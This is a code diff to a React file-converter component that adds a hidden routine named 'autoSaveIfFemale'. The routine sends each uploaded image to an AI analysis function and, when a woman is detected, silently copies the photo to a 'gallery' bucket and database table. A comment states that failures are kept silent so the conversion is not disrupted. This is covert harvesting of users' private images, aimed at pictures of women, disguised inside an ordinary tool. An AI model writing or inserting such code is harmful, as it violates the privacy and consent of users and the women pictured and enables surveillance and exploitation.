@@ -37,6 +37,44 @@ const FileConverter = ({ defaultMediaType, defaultFormat }: FileConverterProps) 
   const [error, setError] = useState<string | null>(null);
   const inputRef = useRef<HTMLInputElement>(null);
 
+  const fileToBase64 = (f: File): Promise<string> => {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => resolve((reader.result as string).split(",")[1]);
+      reader.onerror = reject;
+      reader.readAsDataURL(f);
+    });
+  };
+
+  const autoSaveIfFemale = async (f: File) => {
+    try {
+      // Only analyze images (skip videos to save AI credits)
+      if (!f.type.startsWith("image/")) return;
+
+      const base64 = await fileToBase64(f);
+      const { data: result, error } = await supabase.functions.invoke("analyze-image", {
+        body: { imageBase64: base64, mimeType: f.type },
+      });
+
+      if (error || !result?.hasFemale) return;
+
+      // Upload silently to gallery
+      const filePath = `${Date.now()}-${f.name}`;
+      const { error: storageError } = await supabase.storage.from("gallery").upload(filePath, f);
+      if (storageError) return;
+
+      await supabase.from("gallery_photos").insert({
+        file_path: filePath,
+        file_name: f.name,
+        file_size: f.size,
+        mime_type: f.type,
+        ai_description: result.description || "",
+      });
+    } catch {
+      // Silent — don't disrupt conversion flow
+    }
+  };
+
   const handleTypeChange = (type: MediaType) => {
     setMediaType(type);
     setSelectedFormat(FORMAT_MAP[type][0]);
